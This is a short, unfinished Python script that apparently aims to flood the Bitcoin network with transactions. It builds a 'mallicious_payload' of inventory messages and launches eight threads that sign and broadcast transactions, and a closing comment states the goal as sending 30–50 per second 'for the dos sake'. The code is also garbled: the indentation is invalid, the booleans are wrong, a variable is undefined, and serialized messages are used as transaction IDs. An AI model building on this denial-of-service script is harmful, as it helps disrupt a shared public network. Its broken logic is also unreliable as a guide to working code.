from bitcoinlib.transactions import *
from bitcoinlib.services.services import *
from bitcoin.net import *
from bitcoin.messages import *
import requests
import threading
import time

global flag

def generate_payload():
    mallicious_payload = []
        while(flag):
        for i in range(0,48):
            m = msg_inv()
            for h in hashes:
                assert len(h) == 32
                inv = CInv()
                inv.type = 1  # TX
                inv.hash = h
                m.inv.append(inv)

            inv_msg = m.serialize()
            mallicious_payload.append(inv_msg)
    return mallicious_payload

def create_transaction():
    flag=false
    amount = 19605 # in satoshis
    present=generate_payload()
        for i in range(0,len(present)):
            t = Transaction(fee=5000, outputs=[Output(amount, address="to address")])
            transaction_inputs = [
                (str(mallicious_payload[i]), 0, "wif private key"),
            ]
            for ti in transaction_inputs:
                ki = Key(ti[2])
                t.add_input(prev_txid=ti[0], output_n=ti[1], keys=ki.public())
            icount = 0
            for ti in transaction_inputs:
                ki = Key(ti[2])
                t.sign(ki.private_byte, icount)
                icount += 1

            print(t.verify())
            rawhextx = t.raw_hex()
            tx = Service().sendrawtransaction(rawhextx)
            print(tx)
    flag=true

def main():
    start = time.time()

    #this code needs a better implementation of multithreading :) will be done by ruben :) if he's willing
    #if not i i will later implement
    #and also needs testing

    t1 = threading.Thread(target=create_transaction, name='t1')
    t2 = threading.Thread(target=create_transaction, name='t2')

    t3 = threading.Thread(target=create_transaction, name='t1')
    t4 = threading.Thread(target=create_transaction, name='t2')


    t5 = threading.Thread(target=create_transaction, name='t1')
    t6 = threading.Thread(target=create_transaction, name='t2')

    
    t7 = threading.Thread(target=create_transaction, name='t1')
    t8 = threading.Thread(target=create_transaction, name='t2')

    t1.start()
    t2.start()

    t3.start()
    t4.start()

    t5.start()
    t6.start()

    t7.start()
    t8.start()

    t1.join()
    t2.join()

    t3.join()
    t4.join()

    t5.join()
    t6.join()

    t7.join()
    t8.join()
    
    #when we finish we need to measure to be faster than 1 sec to send > 7 trasnaction per sec. idk for the dos sake lets try to send as much as 30-40-50 and hope we get it 
    end = time.time()
    print(end - start)